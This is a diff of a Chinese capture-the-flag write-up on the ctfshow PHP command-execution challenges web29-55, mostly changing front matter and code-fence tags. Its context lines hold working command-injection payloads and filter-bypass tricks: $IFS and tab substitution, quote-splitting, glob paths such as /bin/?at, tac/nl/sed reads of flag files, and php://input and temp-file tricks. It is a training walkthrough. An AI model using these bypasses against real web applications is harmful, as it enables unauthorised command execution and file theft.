@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[命令执行] web29-55 Writeup"
 date: 2022-08-08T16:55:37+08:00
 draft: false
-tags: ['ctf']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['ctf']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 命令执行及绕过技巧
 
@@ -27,7 +44,7 @@ autoCollapseToc: false
 
 下面介绍一下 Linux 下几种绕过关键字过滤的方式
 
-```
+```bash
 cat fl''ag.php
 cat fl""ag.php
 cat fl\ag.php
@@ -39,7 +56,7 @@ cat fla?.???
 
 另外拼接字符也能够绕过, 例如
 
-```
+```bash
 a=fl;b=ag;cat $a$b.php # cat flag.php
 ```
 
@@ -47,7 +64,7 @@ a=fl;b=ag;cat $a$b.php # cat flag.php
 
 ## web30
 
-```
+```php
 if(!preg_match("/flag|system|php/i", $c)){
         eval($c);
 }
@@ -67,7 +84,7 @@ http://7f626fea-3dee-431b-90a1-7c9555cd30a7.challenge.ctf.show/?c=echo `cat fl*`
 
 ## web31
 
-```
+```php
 if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
     eval($c);
 }
@@ -77,7 +94,7 @@ if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
 
 过滤空格的几种绕过方式如下
 
-```
+```bash
 %09 (PHP 环境)
 {cat,flag.php}
 cat${IFS}flag.php
@@ -89,7 +106,7 @@ $a=$'\x20flag.php'&&cat$a (\x20 代表空格)
 
 过滤 cat 的绕过方式
 
-```
+```bash
 more
 less
 head
@@ -118,7 +135,7 @@ http://e71bd105-44bb-4322-a7b6-3290f09d59cb.challenge.ctf.show/?c=echo`tac%09fla
 
 `localeconv()` 返回包含本地化数字和货币格式信息的关联数组 (没看懂), 但是要注意的是数组的第一个值为 `.`
 
-```
+```php
 array(18) {
   ["decimal_point"]=>
   string(1) "."
@@ -165,8 +182,7 @@ array(18) {
 
 `scandir()` 用于列出指定路径中的文件和目录, 这里列出当前目录下的内容
 
-```
-
+```php
 array(4) {
   [0]=>
   string(1) "."
@@ -181,7 +197,7 @@ array(4) {
 
 `array_reverse()` 将数组翻转, 就变成了下面这样
 
-```
+```php
 array(4) {
   [0]=>
   string(9) "index.php"
@@ -202,7 +218,7 @@ array(4) {
 
 ## web32
 
-```
+```php
 if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
     eval($c);
 }
@@ -214,7 +230,7 @@ if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
 
 PHP 中 include 和 require 函数无需括号和空格也能使用
 
-```
+```php
 include"a.php"
 require"b.php"
 ```
@@ -237,7 +253,7 @@ require"b.php"
 
 ## web33
 
-```
+```php
 if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
     eval($c);
 }
@@ -296,7 +312,7 @@ php://input 绕过
 
 ## web38
 
-```
+```php
 if(!preg_match("/flag|php|file/i", $c)){
     include($c);
     echo $flag;
@@ -407,7 +423,7 @@ hint 用的是 session 的方式
 
 wp 中已经给出了脚本, 我这里自己写一个 python 脚本
 
-```
+```python
 import re
 
 preg = '[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-'
@@ -514,7 +530,7 @@ http://af01b830-cdd7-45cc-9a2b-92d8b773afdc.challenge.ctf.show/?c=tac${IFS}fla*|
 
 hint 如下
 
-```
+```bash
 echo$IFS`tac$IFS*`%0A
 ```
 
@@ -556,27 +572,27 @@ tac 和 nl 绕过
 
 sed
 
-```
+```bash
 sed '1ahello' flag.txt # 向第1行后面追加 hello, 但由于没有加 -n 选项, 默认输出文件所有内容
 sed -n '/ctfshow/p' flag.txt # 打印匹配到 ctfshow 关键字的那一行
 ```
 
 cut
 
-```
+```bash
 cut -b 1-99 flag.txt # 提取每一行的第1-99个字节
 cut -d$'\n' -f1-99 flag.txt # 按换行符分割, 查看第1-99个字段
 ```
 
 awk
 
-```
+```bash
 awk -F$'\n' '{print $1}' flag.txt # 按换行符分割字段, 依次打印
 ```
 
 curl
 
-```
+```bash
 curl file:///home/exp10it/flag.txt # 需要知道绝对路径
 ```
 
@@ -632,7 +648,7 @@ nl 绕过
 
 看了 hint 发现 `''` 绕过也适用于 Linux 命令
 
-```
+```bash
 c''at${IFS}fla''g.p''hp
 ```
 
@@ -652,7 +668,7 @@ http://e0414892-98e9-4268-b037-7cb78f8fef71.challenge.ctf.show/?c=vi${IFS}fla?.p
 
 网上 wp 的其他绕过方式
 
-```
+```bash
 uniq${IFS}fla?.php
 grep${IFS}'ctfshow'${IFS}fla?.php
 mv${IFS}fla?.php${IFS}a.txt # 浏览器访问 a.txt
@@ -660,7 +676,7 @@ mv${IFS}fla?.php${IFS}a.txt # 浏览器访问 a.txt
 
 hint 的方法比较有意思
 
-```
+```bash
 /bin/?at${IFS}f???????
 ```
 
@@ -708,7 +724,7 @@ php 上传文件时的缓存文件存储路径一般是 /tmp, 文件名为 `php[
 
 Linux 使用 glob 通配符 `[@-[]` 来匹配大写字母 (ASCII 码区间)
 
-```
+```bash
 /?c=. /???/????????[@-[]
 ```
 
